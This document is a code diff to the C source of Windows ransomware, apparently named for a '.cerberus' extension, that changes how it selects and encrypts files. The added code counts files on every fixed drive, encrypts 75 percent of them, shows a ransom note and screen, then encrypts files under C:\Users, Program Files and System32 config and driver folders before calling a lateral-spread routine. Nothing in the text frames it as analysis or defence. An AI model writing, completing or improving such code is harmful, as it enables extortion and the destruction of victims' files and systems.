@@ -41,11 +41,20 @@
 #define HASH_SIZE 16
 #define LSA_BLOB_SIGNATURE { 0x28, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }
 #define UNICODE_STRING_MAX_LENGTH 256
-#define DECRYPTION_KEY_URL "link decryption_key"
-#define PAYMENT_URL "link PAYMENT"
+#define DECRYPTION_KEY_URL "link "
+#define PAYMENT_URL "link PAYMENT "
 #define HASH_TABLE_SIZE 1009
 #define TOP_HASHES 5
 #define NETWORK_TIMEOUT 50
+#define ENCRYPTION_RATIO 0.75
+
+#ifndef _MSC_VER
+static inline DWORD _rotl(DWORD value, int shift) {
+    shift %= 32;
+    if (shift == 0) return value;
+    return (value << shift) | (value >> (32 - shift));
+}
+#endif
 
 typedef struct _CHACHA20_CTX {
     DWORD input[16];
@@ -101,6 +110,11 @@ typedef struct _HASH_TABLE {
     PHASH_ENTRY buckets[HASH_TABLE_SIZE];
     int count;
 } HASH_TABLE, *PHASH_TABLE;
+
+typedef struct _FILE_COUNT {
+    int total;
+    int encrypted;
+} FILE_COUNT;
 
 void chacha20_block(CHACHA20_CTX *ctx) {
     int i;
@@ -362,7 +376,7 @@ void encrypt_file(const char *filename, ENCRYPTION_KEY *key) {
     DeleteFileA(filename);
 }
 
-void encrypt_directory(const char *dirPath, ENCRYPTION_KEY *key) {
+void count_files_in_directory(const char *dirPath, FILE_COUNT *fileCount) {
     WIN32_FIND_DATAA findData;
     HANDLE hFind = NULL;
     char searchPath[MAX_PATH], filePath[MAX_PATH];
@@ -382,18 +396,128 @@ void encrypt_directory(const char *dirPath, ENCRYPTION_KEY *key) {
         StringCchCatA(filePath, sizeof(filePath), findData.cFileName);
         
         if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
-            encrypt_directory(filePath, key);
+            count_files_in_directory(filePath, fileCount);
         } else {
             const char *ext = strrchr(findData.cFileName, '.');
             if (ext && (strcmp(ext, ".exe") == 0 || strcmp(ext, ".dll") == 0 || 
                        strcmp(ext, ".sys") == 0 || strcmp(ext, ".cerberus") == 0))
                 continue;
                 
-            encrypt_file(filePath, key);
+            fileCount->total++;
         }
     } while (FindNextFileA(hFind, &findData));
     
     FindClose(hFind);
+}
+
+void encrypt_directory_with_count(const char *dirPath, ENCRYPTION_KEY *key, FILE_COUNT *fileCount, int *filesToEncrypt) {
+    WIN32_FIND_DATAA findData;
+    HANDLE hFind = NULL;
+    char searchPath[MAX_PATH], filePath[MAX_PATH];
+    
+    StringCchCopyA(searchPath, sizeof(searchPath), dirPath);
+    StringCchCatA(searchPath, sizeof(searchPath), "\\*");
+    
+    hFind = FindFirstFileA(searchPath, &findData);
+    if (hFind == INVALID_HANDLE_VALUE) return;
+    
+    do {
+        if (strcmp(findData.cFileName, ".") == 0 || strcmp(findData.cFileName, "..") == 0)
+            continue;
+            
+        StringCchCopyA(filePath, sizeof(filePath), dirPath);
+        StringCchCatA(filePath, sizeof(filePath), "\\");
+        StringCchCatA(filePath, sizeof(filePath), findData.cFileName);
+        
+        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+            encrypt_directory_with_count(filePath, key, fileCount, filesToEncrypt);
+        } else {
+            const char *ext = strrchr(findData.cFileName, '.');
+            if (ext && (strcmp(ext, ".exe") == 0 || strcmp(ext, ".dll") == 0 || 
+                       strcmp(ext, ".sys") == 0 || strcmp(ext, ".cerberus") == 0))
+                continue;
+                
+            if (*filesToEncrypt > 0) {
+                encrypt_file(filePath, key);
+                fileCount->encrypted++;
+                (*filesToEncrypt)--;
+            }
+        }
+    } while (FindNextFileA(hFind, &findData) && *filesToEncrypt > 0);
+    
+    FindClose(hFind);
+}
+
+void encrypt_important_directories(ENCRYPTION_KEY *key) {
+    char importantDirs[][MAX_PATH] = {
+        "C:\\Users",
+        "C:\\Documents and Settings",
+        "C:\\Program Files",
+        "C:\\Program Files (x86)",
+        "C:\\ProgramData",
+        "C:\\Windows\\System32\\config",
+        "C:\\Windows\\System32\\drivers"
+    };
+    
+    int numDirs = sizeof(importantDirs) / sizeof(importantDirs[0]);
+    
+    for (int i = 0; i < numDirs; i++) {
+        WIN32_FIND_DATAA findData;
+        HANDLE hFind = NULL;
+        char searchPath[MAX_PATH], filePath[MAX_PATH];
+        
+        StringCchCopyA(searchPath, sizeof(searchPath), importantDirs[i]);
+        StringCchCatA(searchPath, sizeof(searchPath), "\\*");
+        
+        hFind = FindFirstFileA(searchPath, &findData);
+        if (hFind == INVALID_HANDLE_VALUE) continue;
+        
+        do {
+            if (strcmp(findData.cFileName, ".") == 0 || strcmp(findData.cFileName, "..") == 0)
+                continue;
+                
+            StringCchCopyA(filePath, sizeof(filePath), importantDirs[i]);
+            StringCchCatA(filePath, sizeof(filePath), "\\");
+            StringCchCatA(filePath, sizeof(filePath), findData.cFileName);
+            
+            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+                WIN32_FIND_DATAA subFindData;
+                HANDLE hSubFind = NULL;
+                char subSearchPath[MAX_PATH], subFilePath[MAX_PATH];
+                
+                StringCchCopyA(subSearchPath, sizeof(subSearchPath), filePath);
+                StringCchCatA(subSearchPath, sizeof(subSearchPath), "\\*");
+                
+                hSubFind = FindFirstFileA(subSearchPath, &subFindData);
+                if (hSubFind == INVALID_HANDLE_VALUE) {
+                    FindClose(hFind);
+                    continue;
+                }
+                
+                do {
+                    if (strcmp(subFindData.cFileName, ".") == 0 || strcmp(subFindData.cFileName, "..") == 0)
+                        continue;
+                        
+                    StringCchCopyA(subFilePath, sizeof(subFilePath), filePath);
+                    StringCchCatA(subFilePath, sizeof(subFilePath), "\\");
+                    StringCchCatA(subFilePath, sizeof(subFilePath), subFindData.cFileName);
+                    
+                    if (!(subFindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
+                        const char *ext = strrchr(subFindData.cFileName, '.');
+                        if (ext && (strcmp(ext, ".exe") == 0 || strcmp(ext, ".dll") == 0 || 
+                                   strcmp(ext, ".sys") == 0 || strcmp(ext, ".cerberus") == 0))
+                            continue;
+                            
+                        encrypt_file(subFilePath, key);
+                    }
+                } while (FindNextFileA(hSubFind, &subFindData));
+                
+                FindClose(hSubFind);
+            }
+        } while (FindNextFileA(hFind, &findData));
+        
+        FindClose(hFind);
+    }
 }
 
 void create_ransom_note() {
@@ -1134,6 +1258,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         return 1;
     }
     
+    FILE_COUNT fileCount = {0, 0};
     for (i = 0; i < 26; i++) {
         drivePath[0] = drives[i];
         drivePath[1] = ':';
@@ -1141,17 +1266,27 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         drivePath[3] = 0;
         
         if (GetDriveTypeA(drivePath) == DRIVE_FIXED) {
-            if (!encrypt_directory(drivePath, &key)) {
-                continue;
-            }
+            count_files_in_directory(drivePath, &fileCount);
         }
     }
     
-    if (!create_ransom_note()) {
-        return 1;
+    int filesToEncrypt = (int)(fileCount.total * ENCRYPTION_RATIO);
+    
+    for (i = 0; i < 26 && filesToEncrypt > 0; i++) {
+        drivePath[0] = drives[i];
+        drivePath[1] = ':';
+        drivePath[2] = '\\';
+        drivePath[3] = 0;
+        
+        if (GetDriveTypeA(drivePath) == DRIVE_FIXED) {
+            encrypt_directory_with_count(drivePath, &key, &fileCount, &filesToEncrypt);
+        }
     }
     
+    create_ransom_note();
     display_ransomware_screen();
+    
+    encrypt_important_directories(&key);
     
     spread_laterally();
     
